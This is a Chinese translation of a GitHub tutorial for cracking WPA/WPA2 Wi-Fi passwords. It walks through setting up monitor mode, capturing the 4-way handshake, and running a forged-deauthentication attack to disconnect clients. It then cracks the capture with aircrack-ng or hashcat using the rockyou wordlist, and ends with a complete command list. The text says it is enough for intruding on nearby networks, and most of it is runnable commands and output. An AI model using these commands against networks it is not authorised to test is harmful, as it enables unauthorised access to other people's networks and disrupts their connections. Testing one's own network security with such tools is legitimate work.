Wi-Fi 破解
来自于GitHub：
https://github.com/brannondorsey/wifi-cracking/blob/master/README.zh.md

利用 Airodump-ng 以及 Aircrack-ng / Hashcat 破解 WPA/WPA2 WI-FI 路由器。

这是个简洁的教程，一步一步的描述了如何破解使用弱密码保护的 WI-FI 网络。它不会极尽其详，但是足够你用来测试自己的网络安全或者入侵附近网络。下面列出的攻击完全是被动式的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。不过一个可选的 deauthentication 攻击可以用于加速侦查过程，在文档末尾有描述。

如果你熟悉这个过程，你可以跳过这段描述直接跳到底部使用的命令列表。更多种建议以及可行的方法，参考附录。neal1991 也将 这份文档 以及附录翻译成中文，可以选择你偏好的版本。

声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。

入门

这个教程假定你：

可以流畅使用命令行
使用一个基于debian的linux发行版本，最好是 Kali linux（OSX用户参考附录）
安装 Aircrack-ng
sudo apt-get install aircrack-ng
拥有一块支持监测模式的无线网卡（对于支持的设备列表，参考这里)
破解一个WI-FI网络

监测模式 (Monitor Mode)

让我们通过下面的命令可以列出支持监测模式的无线接口开始：

airmon-ng
如果你没有看到有接口列出，意味着你的无线网卡就不支持监测模式 😞

我们将假设你的无线接口名称是 wlan0，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监测模式：

airmon-ng start wlan0
运行 iwconfig。你现在应该能够看到列出一个新的监测模式接口（比如 mon0 或者 wlan0mon）。

找到你的目标

使用你的监测接口开始监听附近的 802.11 Beacon 帧广播：

airodump-ng mon0
你应该可以看到类似于下面的输出。

CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         
                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   
 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          
 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>                                                        
 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                          
 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                 
 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin's Awesome                                                   
 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                 
 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                          
 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                    
 BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                
 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca
出于这个演示的目的，我们将会破解我自己的网络，"hackme"。记住利用 airodump-ng 展示的 BSSID， MAC 地址以及信道（CH）号，在下一个步骤中我们将会需要它们。

捕获 4-way Handshake

WPA/WPA2 使用 4-way Handshake 来认证设备连接网络。你不需要明白这些的含意，但是你必须抓取 handshake 才能破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及 bssid 值来使用 airmon-ng 来监视目标网络。

# 将 -c 以及 --bssid 值替换为你的目标网络值
# -w 用来指定我们保存捕获到数据包的文件夹
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS  
现在让我们等一会儿... 当我们捕捉到一个握手时，你应该能够马上在屏幕的右上角看到类似于[ WPA handshake: bc:d3:c9:ef:d2:67的一些东西。

如果你不想等，也不反感进行一次主动攻击，你可以强制设备连接到目标网络来重新连接，并且在目标网络中发送恶意 deauthentication 数据包。通常这样就可以抓到 4-way handshake 了。参考下面的 deauth 攻击章节 来获取关于此的信息。

一旦你捕获了一个握手，按下 ctrl-c 来终止 airodump-ng。这是在你指定的 airodump-ng 输出目录下，应该看到一个用来保存捕获信息的.cap文件（比如叫做-01.cap）。我们将会使用这个捕获文件来破解网络密码。个人喜欢将这个文件重命名为当前正在尝试破解的网络名称：

mv ./-01.cap hackme.cap
破解网络密码

最后一个步骤是使用捕获的 handshake 数据来破解密码。如果你能够访问 GPU，我强烈建议你使用 hashcat 来破解密码。我已经创建了一个叫做 naive-hashcat 的简单工具可以让使用 hashcat 变得非常方便。如果你不能够访问 GPU，还有很多在线的 GPU 破解服务可以使用，比如 GPUHASH.me 或者 OnlineHashCrack 。你也可以常使用 Aircrack-ng 来进行 CPU 破解。

注意下面的攻击方法都假设用户正在使用弱密码。现如今很多 WPA/WPA2 路由自带 12 位强随机密码，大部分用户都不会去更改。如果你去尝试破解这些密码，我建议你使用 Probable-Wordlists WPA-length 字典文件。

使用 naive-hashcat 破解（推荐）

在我们使用 naive-hashcat 破解密码之前，我们需要将我们的 .cap 文件转换成同等 hashcat 文件格式 .hccapx。你可以通过上传 .cap 文件到 https://hashcat.net/cap2hccapx/ 或者直接使用 cap2hccapx 工具。

cap2hccapx.bin hackme.cap hackme.hccapx
接着，下载并运行 naive-hashcat：

# 下载
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 下载 134MB rockyou 字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 破解！宝贝！破解！
# 2500 是 hashcat 对于 WPA/WPA2 的哈希模式
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
Naive-hashcat 使用多种字典，规则，组合以及伪装（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到hackme.pot，因此不时要检查这个文件。一旦你破解这个密码，你将会在你的 POI_FILE 看到类似于下面的内容：

e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
最后两块被 : 分隔开来，分别是网络名称和密码。

如果你想直接使用 hashcat 而不是 naive-hashcat 的话请参考这个页面。

利用 Aircrack-ng 破解

Aircrack-ng 可以用于在你的 CPU 上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的 rockyou 字典文件：

# 下载 134MB rockyou 字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
注意，如果网络密码不再这个单词文件话，你将不能破解密码。

# -a2 指定 WPA2，-b 是 BSSID，-w 是字典文件
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
如果密码被破解了，你将会在终端看到一个 KEY FOUND! 消息，后面跟着的文本就是网络密码。

                                 Aircrack-ng 1.2 beta3


                   [00:01:49] 111040 keys tested (1017.96 k/s)


                         KEY FOUND! [ hacktheplanet ]


      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 

      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 

      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
Deauth Attack

Deauth 攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的 “发件人” 地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用airodump-ng进行侦听，就能捕获到 4-way handshake。

使用 airodump-ng 监视特定接入点（使用 -c channel --bssid MAC），直到看到客户端（STATION）连接。 连接的客户端看起来像这样，64：BC：0C：48：97：F7 是客户端 MAC。

 CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
                                                                                                                                           
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
现在，先不管这个正在运行的 airodump-ng ，打开一个新的终端。 我们用 aireplay-ng 命令向我们的受害者客户端发送伪造的解除认证数据包，强制其重新连接到网络，以便在此过程中抓取 handshake。

# -0 2 指定了我们将发送 2 个解除认证的数据包。如果需要
# 可以增加这个数字，但随之而来客户端网络可能中断，有被人注意到的风险。
# -a 是接入点的 MAC
# -c 是客户端的 MAC
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
你也可以选择得通过广播解除认证数据包到所有连接的客户端：

# 尽管不是所有的客户端都会响应广播解除认证
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
发送了解除认证数据包后，回到你的 airodump-ng 进程，运气好的话你现在应该看到右上角：[WPA握手：9C：5C：8E：C9：AB：C0。 现在你已经捕获了握手，你应该准备好破解网络密码。

命令列表

下面列出了破解WPA/WPA2网络所需的所有命令，以最少的解释为依据。

# 将你的设备设置成监测模式
airmon-ng start wlan0

# 监听附近所有的 beacon 帧来获取目标 BSSID 以及信道
airodump-ng mon0

# 开始监听握手
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# 选择性的对于连接的设备进行解除验证从而强制握手
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## 利用 aircrack-ng 破解密码... ##########

# 如果需要的话下载 134MB 的 rockyou.txt 字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 利用 w/ aircrack-ng 破解
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## 或者利用 naive-hashcat 破解密码 ##########

# 将 cap 转换成 hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# 利用 naive-hashcat 破解
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
